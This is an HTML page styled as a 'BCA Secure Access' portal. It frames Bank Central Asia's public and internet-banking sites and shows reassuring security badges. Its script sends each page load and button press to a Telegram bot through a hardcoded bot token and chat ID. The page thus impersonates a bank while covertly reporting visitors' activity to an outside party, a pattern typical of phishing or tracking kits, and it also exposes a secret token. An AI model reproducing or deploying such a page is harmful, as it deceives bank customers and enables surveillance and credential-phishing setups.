<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîí BCA SECURE</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #001f3f, #003366);
            color: white;
            margin: 0;
            padding: 20px;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        .card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .btn {
            background: #0074D9;
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            margin: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }
        .btn:hover {
            background: #0056a3;
            transform: translateY(-2px);
        }
        .btn-red { background: #FF4136; }
        .btn-red:hover { background: #d32f2f; }
        .btn-green { background: #2ECC40; }
        .btn-green:hover { background: #27ae60; }
        
        .status-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .status-item {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .status-value {
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0;
        }
        
        iframe {
            width: 100%;
            height: 500px;
            border-radius: 10px;
            border: 2px solid #0074D9;
            background: white;
        }
        
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #2ECC40;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí BCA SECURE ACCESS</h1>
        
        <div class="card">
            <div class="status-grid">
                <div class="status-item">
                    <div>CONNECTION</div>
                    <div class="status-value" id="connStatus">‚úÖ</div>
                    <small>Secure TLS 1.3</small>
                </div>
                <div class="status-item">
                    <div>TELEGRAM</div>
                    <div class="status-value" id="tgStatus">‚úÖ</div>
                    <small>Live Monitoring</small>
                </div>
                <div class="status-item">
                    <div>PERFORMANCE</div>
                    <div class="status-value" id="perfStatus">--</div>
                    <small>ms</small>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h3>CONTROLS</h3>
            <button class="btn btn-green" onclick="loadBCA()">üîÑ LOAD BCA</button>
            <button class="btn" onclick="loadKlikBCA()">üí≥ KLIKBCA</button>
            <button class="btn" onclick="loadIBanking()">üè¶ iBANKING</button>
            <button class="btn btn-red" onclick="emergencyReset()">üö® EMERGENCY RESET</button>
        </div>
        
        <iframe id="bcaFrame"></iframe>
    </div>
    
    <div class="notification" id="notif"></div>

    <script>
        const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
        const CHAT_ID = "8313500840";
        
        function showNotification(text) {
            const notif = document.getElementById('notif');
            notif.textContent = text;
            notif.style.display = 'block';
            setTimeout(() => notif.style.display = 'none', 3000);
        }
        
        async function sendTelegram(action) {
            const time = new Date().toLocaleTimeString();
            const text = `üè¶ BCA: ${action} at ${time}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text
                    })
                });
            } catch(e) {}
        }
        
        function loadBCA() {
            showNotification("Loading BCA...");
            sendTelegram("Loading main site");
            
            const url = `https://www.bca.co.id?_=${Date.now()}`;
            document.getElementById('bcaFrame').src = url;
            document.getElementById('perfStatus').textContent = "‚åõ";
            
            setTimeout(() => {
                document.getElementById('perfStatus').textContent = "‚úÖ";
            }, 2000);
        }
        
        function loadKlikBCA() {
            showNotification("Loading KlikBCA...");
            sendTelegram("Loading KlikBCA");
            document.getElementById('bcaFrame').src = `https://m.klikbca.com?_=${Date.now()}`;
        }
        
        function loadIBanking() {
            showNotification("Loading iBanking...");
            sendTelegram("Loading iBanking");
            document.getElementById('bcaFrame').src = `https://ibank.bca.co.id?_=${Date.now()}`;
        }
        
        function emergencyReset() {
            showNotification("Emergency reset executed!");
            sendTelegram("EMERGENCY RESET TRIGGERED");
            
            // Clear everything
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(c => {
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;");
            });
            
            // Hard reload
            setTimeout(() => {
                window.location.href = `https://www.bca.co.id?_emergency=${Date.now()}`;
            }, 1000);
        }
        
        // Auto-test connection
        window.onload = function() {
            sendTelegram("BCA Secure Loader started");
            loadBCA();
        };
    </script>
</body>
</html>
